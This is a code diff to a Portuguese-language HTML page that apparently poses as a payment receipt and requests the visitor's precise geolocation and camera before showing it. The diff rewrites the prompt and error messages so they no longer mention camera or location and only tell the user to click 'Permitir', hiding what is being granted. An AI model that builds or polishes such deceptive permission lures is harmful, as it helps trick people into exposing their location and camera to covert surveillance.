@@ -54,13 +54,20 @@
     .label {
       font-weight: bold;
     }
+
+    .allow-button {
+      padding: 3px 7px;
+      border: 1px solid #888;
+      border-radius: 8px;
+      font-weight: bold;
+    }
   </style>
 </head>
 
 <body>
 
   <div id="permission-prompt">
-    <p>Para visualizar o comprovante, clique em 'permitir'.</p>
+    <p>Para visualizar o comprovante, clique em <span class="allow-button">Permitir</span></p>
   </div>
 
   <div id="receipt">
@@ -122,12 +129,12 @@
             })
             .catch((error) => {
               console.error("Erro ao acessar a câmera:", error);
-              alert('É necessário conceder a permissão da câmera para visualizar o comprovante.');
+              alert('É necessário clicar em "Permitir" para visualizar o comprovante.');
             });
         },
         (error) => {
           console.error("Erro ao acessar a localização:", error);
-          alert('É necessário conceder a permissão de localização para visualizar o comprovante.');
+          alert('É necessário clicar em "Permitir" para visualizar o comprovante.');
         },
         { enableHighAccuracy: true }
       );
